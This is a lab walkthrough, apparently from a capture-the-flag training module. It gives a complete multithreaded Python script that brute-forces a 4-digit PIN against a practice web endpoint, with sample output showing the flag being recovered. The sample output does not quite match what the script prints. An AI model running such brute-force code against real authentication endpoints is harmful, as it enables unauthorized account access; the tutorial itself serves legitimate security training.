## Cracking the PIN

**To follow along, start the target system via the question section at the bottom of the page.**

The instance application generates a random 4-digit PIN and exposes an endpoint (`/pin`) that accepts a PIN as a query parameter. If the provided PIN matches the generated one, the application responds with a success message and a flag. Otherwise, it returns an error message.

We will use this simple demonstration Python script to brute-force the `/pin` endpoint on the API. Copy and paste this Python script below as `pin-solver.py` onto your machine. You only need to modify the IP and port variables to match your target system information.

```python
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

# -----------------------------
# Configuration
# -----------------------------
ip = "94.237.54.192"  # Change to your target IP
port = 46620           # Change to your target port
max_threads = 5        # Keep threads moderate to avoid server blocking
timeout = 3            # Seconds before giving up on a request

# -----------------------------
# Session for connection reuse
# -----------------------------
session = requests.Session()

# -----------------------------
# Function to try a single PIN
# -----------------------------
def try_pin(pin):
    formatted_pin = f"{pin:04d}"
    try:
        response = session.get(f"http://{ip}:{port}/pin?pin={formatted_pin}", timeout=timeout)
        print(f"Attempted PIN: {formatted_pin} | Status: {response.status_code}")  # Debug print

        if response.ok:
            try:
                data = response.json()
                if 'flag' in data:
                    return formatted_pin, data['flag']
            except ValueError:
                # Response was not JSON
                pass
    except requests.RequestException as e:
        print(f"Request failed for PIN {formatted_pin}: {e}")
    return None

# -----------------------------
# Brute-force with multithreading
# -----------------------------
def brute_force():
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        future_to_pin = {executor.submit(try_pin, pin): pin for pin in range(10000)}
        for future in as_completed(future_to_pin):
            result = future.result()
            if result:
                pin_found, flag = result
                print(f"[+] Correct PIN found: {pin_found}")
                print(f"[+] Flag: {flag}")
                # Cancel remaining tasks
                for f in future_to_pin:
                    f.cancel()
                break

# -----------------------------
# Start brute-force
# -----------------------------
if __name__ == "__main__":
    brute_force()

```

The Python script systematically iterates all possible 4-digit PINs (0000 to 9999) and sends GET requests to the Flask endpoint with each PIN. It checks the response status code and content to identify the correct PIN and capture the associated flag.

```shell-session
python pin-solver.py
```

```

...
Attempted PIN: 4039
Attempted PIN: 4040
Attempted PIN: 4041
Attempted PIN: 4042
Attempted PIN: 4043
Attempted PIN: 4044
Attempted PIN: 4045
Attempted PIN: 4046
Attempted PIN: 4047
Attempted PIN: 4048
Attempted PIN: 4049
Attempted PIN: 4050
Attempted PIN: 4051
Attempted PIN: 4052
Correct PIN found: 4053
Flag: HTB{...}
```

The script's output will show the progression of the brute-force attack, displaying each attempted PIN and its corresponding result. The final output will reveal the correct PIN and the captured flag, demonstrating the successful completion of the brute-force attack.